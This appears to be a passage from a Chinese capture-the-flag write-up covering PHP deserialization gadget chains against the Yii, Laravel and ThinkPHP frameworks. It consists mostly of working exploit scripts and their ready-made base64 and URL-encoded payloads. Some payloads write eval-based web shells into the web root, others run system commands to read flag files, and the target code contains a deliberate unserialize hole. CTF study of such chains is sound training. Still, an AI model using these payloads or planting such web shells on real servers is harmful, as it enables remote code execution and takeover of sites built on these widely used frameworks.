language_">$this</span>-&gt;id = <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[zf]);?&gt;&#x27; &gt; /var/www/html/basic/web/zf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6NjU6ImVjaG8gJzw/cGhwIGV2YWwoJF9QT1NUW3pmXSk7Pz4nID4gL3Zhci93d3cvaHRtbC9iYXNpYy93ZWIvemYucGhwIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br></pre></td></tr></table></figure><p>写文件进去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406185921224.png" alt="image-20220406185921224"></p><p>直接蚁剑连咯</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406190032603.png" alt="image-20220406190032603"></p><h1 id="web268-270"><a href="#web268-270" class="headerlink" title="web268-270"></a>web268-270</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2021-05-03 21:55:29</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2021-05-04 01:25:28</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">echo</span> &quot;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&quot; &gt;/var/www/html/basic/web/1.php&#x27;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize(<span class="subst">$exp</span>)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">    #TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzFdKTtwaHBpbmZvKCk7Pz4iID4vdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19</span></span><br></pre></td></tr></table></figure><p>真坏上面的不给用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406190810072.png" alt="image-20220406190810072"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406190826680.png" alt="image-20220406190826680"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406190850719.png" alt="image-20220406190850719"></p><h1 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h1><h2 id="Laravel利用链"><a href="#Laravel利用链" class="headerlink" title="Laravel利用链"></a>Laravel利用链</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Laravel - A PHP Framework For Web Artisans</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>  Laravel</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Taylor Otwell &lt;taylor<span class="doctag">@laravel</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LARAVEL_START&#x27;</span>, <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Register The Auto Loader</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Composer provides a convenient, automatically generated class loader for</span></span><br><span class="line"><span class="comment">| our application. We just need to utilize it! We&#x27;ll simply require it</span></span><br><span class="line"><span class="comment">| into the script here so that we don&#x27;t have to worry about manual</span></span><br><span class="line"><span class="comment">| loading any of our classes later on. It feels great to relax.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Turn On The Lights</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| We need to illuminate PHP development, so let us turn on the lights.</span></span><br><span class="line"><span class="comment">| This bootstraps the framework and gets it ready for use, then it</span></span><br><span class="line"><span class="comment">| will load up this application so that we can run it and send</span></span><br><span class="line"><span class="comment">| the responses back to the browser and delight our users.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../bootstrap/app.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Run The Application</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Once we have the application, we can handle the incoming request</span></span><br><span class="line"><span class="comment">| through the kernel, and send the associated response back to</span></span><br><span class="line"><span class="comment">| the client&#x27;s browser allowing them to enjoy the creative</span></span><br><span class="line"><span class="comment">| and wonderful application we have prepared for them.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span> = <span class="variable">$app</span>-&gt;<span class="title function_ invoke__">make</span>(Illuminate\Contracts\Http\<span class="title class_">Kernel</span>::<span class="variable language_">class</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$kernel</span>-&gt;<span class="title function_ invoke__">handle</span>(</span><br><span class="line">    <span class="variable">$request</span> = Illuminate\Http\<span class="title class_">Request</span>::<span class="title function_ invoke__">capture</span>()</span><br><span class="line">);</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span>-&gt;<span class="title function_ invoke__">terminate</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>, <span class="variable">$parameters</span>,<span class="variable">$class</span>,<span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test=<span class="variable">$class</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app=<span class="variable">$app</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$attributes</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes = <span class="variable">$attributes</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">hasBeenBootstrapped</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindings</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bind</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings=<span class="variable">$bind</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">genericuser</span> = <span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>(</span><br><span class="line">        <span class="title class_">array</span>(</span><br><span class="line">            &quot;<span class="title class_">expectedOutput</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),</span><br><span class="line">            &quot;<span class="title class_">expectedQuestions</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\<span class="title function_ invoke__">Application</span>(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>=&gt;</span><br><span class="line">                <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;concrete&quot;</span>=&gt;<span class="string">&quot;Illuminate\Foundation\Application&quot;</span></span><br><span class="line">                )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\<span class="title function_ invoke__">PendingCommand</span>(</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;tac /f*&#x27;</span>),</span><br><span class="line">        <span class="variable">$genericuser</span>,</span><br><span class="line">        <span class="variable">$application</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22tac+%2Ff%2A%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406192112844.png" alt="image-20220406192112844"></p><h1 id="web272-273"><a href="#web272-273" class="headerlink" title="web272-273"></a>web272-273</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>=&quot;<span class="title class_">cat</span> /<span class="title class_">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>=&quot;<span class="title class_">system</span>&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406192709905.png" alt="image-20220406192709905"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406192714478.png" alt="image-20220406192714478"></p><h1 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h1><h2 id="thinkphp利用链"><a href="#thinkphp利用链" class="headerlink" title="thinkphp利用链"></a>thinkphp利用链</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406193030426.png" alt="image-20220406193030426"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406193052196.png" alt="image-20220406193052196"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()</span><br><span class="line">            );</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="variable language_">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJmZW5nIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJmZW5nIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用多加个变量system&#x3D;ls 